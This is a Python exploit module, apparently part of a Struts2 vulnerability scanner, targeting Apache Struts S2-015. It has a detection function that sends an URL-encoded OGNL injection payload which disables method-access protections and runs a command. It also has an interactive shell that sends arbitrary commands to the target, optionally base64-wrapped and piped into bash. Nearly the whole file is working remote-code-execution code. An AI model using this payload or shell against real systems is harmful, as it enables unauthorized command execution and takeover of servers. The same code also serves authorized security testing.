#!/usr/bin/env python
# coding=utf-8
import base64
import urllib
import requests
import urllib3
urllib3.disable_warnings()
from cve.Struts.Struts2scan_main.module.proxy import proxies
from cve.Struts.Struts2scan_main.module.color import color
from requests.exceptions import ConnectionError
from requests.exceptions import ConnectTimeout
from requests.exceptions import Timeout
import re

def s2_015(url):
    print("[*] 开始检测S2-015")
    vul_nname = "s2_015"
    cmd = "echo%2078468794903108696"
    headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69",
    }
    path = "/%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27"+cmd+"%27%29.getInputStream%28%29%29%2C%23q%7D.action"
    try:
        vurl = urllib.parse.urljoin(url, path)
        req = requests.get(vurl, headers=headers, timeout=15, verify=False,proxies = proxies)
        if "78468794903108696" in req.text and re.search("echo.{0,10}" + "78468794903108696", req.text) == None:
            print(color.red("[+]")+"存在漏洞：%s" % vul_nname)
    except:
        pass

def s2_015_exp(url):
    first = True
    try:
        cmdtype = input("命令模式：[1]默认;[2*]base64 : ")
    except:exit()

    if cmdtype == "2":
        print("[2]base64命令模式")
    else:
        print("[1]默认模式")
        
    while 1:
        if first:
            cmd = "echo%2078468794903108696"
        else:
            try:
                cmd = input("> ")
                if cmd == '':continue
                if cmd == 'exit':exit()
            except:exit()
            cmd = cmd.replace(' ','%20')
            if cmdtype == "2":
                cmd = "bash -c {echo,"+str(base64.b64encode(cmd.encode('utf-8')),'utf-8')+"}|{base64,-d}|{bash,-i}"
                cmd = cmd.replace('+','%2B')
        

        headers = {
            "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69",
        }
        path = "/%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27"+cmd+"%27%29.getInputStream%28%29%29%2C%23q%7D.action"

        try:
            vurl = urllib.parse.urljoin(url, path)
            req = requests.get(vurl, headers=headers, timeout=15, verify=False,proxies = proxies)
            if "78468794903108696" not in req.text:
                print(color.red("[!]不存在该漏洞"))
                break
            elif first:
                first = False
                number1 = req.text.index("78468794903108696")
                afterstring = req.text[number1+len("78468794903108696"):number1+len("78468794903108696")+30]
            else:
                number2 = req.text.index(afterstring) 
                print(urllib.parse.unquote(req.text[number1:number2]))
        except ConnectionError as e:  
            print("[!]网络链接错误/代理异常")
            exit()
        except ConnectTimeout as e:  
            print("[!]连接远程服务器超时异常")
            exit()
        except Timeout as e:  
            print("[!]请求URL超时，产生超时异常")
            exit()
        except:pass